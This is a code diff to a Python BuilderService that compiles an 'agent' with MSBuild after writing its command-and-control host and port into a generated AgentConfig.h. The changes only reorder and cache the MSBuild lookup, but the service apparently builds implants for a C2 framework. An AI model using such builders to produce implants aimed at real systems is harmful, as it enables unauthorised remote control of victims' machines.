@@ -38,6 +38,20 @@ class BuilderService:
         self._builds: dict[str, Build] = {}
         self._lock = threading.Lock()
         BUILDS_DIR.mkdir(parents=True, exist_ok=True)
+        # Cache MSBuild availability at startup so the UI can show it immediately
+        try:
+            self._msbuild_path: str | None = self._find_msbuild()
+            self._msbuild_error: str = ""
+        except FileNotFoundError as e:
+            self._msbuild_path = None
+            self._msbuild_error = str(e)
+
+    def check(self) -> dict:
+        return {
+            "available": self._msbuild_path is not None,
+            "msbuild_path": self._msbuild_path,
+            "error": self._msbuild_error,
+        }
 
     # ------------------------------------------------------------------ public
 
@@ -77,18 +91,18 @@ class BuilderService:
         output_dir.mkdir(parents=True, exist_ok=True)
 
         try:
-            # 1. Isolate: copy source tree into a per-build scratch directory
+            # 1. Verify MSBuild is available before doing any filesystem work
+            msbuild = self._find_msbuild()
+
+            # 2. Isolate: copy source tree into a per-build scratch directory
             shutil.copytree(AGENT_SRC, src_dir)
 
-            # 2. Inject build parameters via the generated config header
+            # 3. Inject build parameters via the generated config header
             (src_dir / "AgentConfig.h").write_text(
                 f'#pragma once\n'
                 f'#define AGENT_C2_HOST "{build.host}"\n'
                 f'#define AGENT_C2_PORT {build.port}\n'
             )
-
-            # 3. Resolve MSBuild
-            msbuild = self._find_msbuild()
 
             # 4. Build
             platform = ARCH_PLATFORM.get(build.arch, "x64")
